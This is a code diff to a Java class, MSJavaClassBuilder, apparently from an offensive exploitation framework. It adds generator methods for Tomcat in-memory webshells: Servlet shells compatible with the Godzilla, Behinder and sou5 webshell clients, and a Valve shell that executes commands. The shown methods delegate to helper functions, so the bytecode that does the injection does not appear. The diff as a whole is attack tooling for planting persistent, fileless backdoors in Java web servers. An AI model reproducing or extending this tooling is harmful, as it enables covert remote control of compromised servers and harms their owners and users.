@@ -132,6 +132,28 @@ public class MSJavaClassBuilder {
     }
 
     @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] tomcatServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] tomcatServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        behinderMS(javaClassHelper);
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.sou5)
+    public byte[] tomcatServletSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Filter)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
@@ -149,6 +171,13 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Executor)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] tomcatExecutorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Valve)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] tomcatValveExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -177,7 +206,6 @@ public class MSJavaClassBuilder {
 
         // response
         jettyListenerResponseMaker(ctClass);
-
 
         JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
 
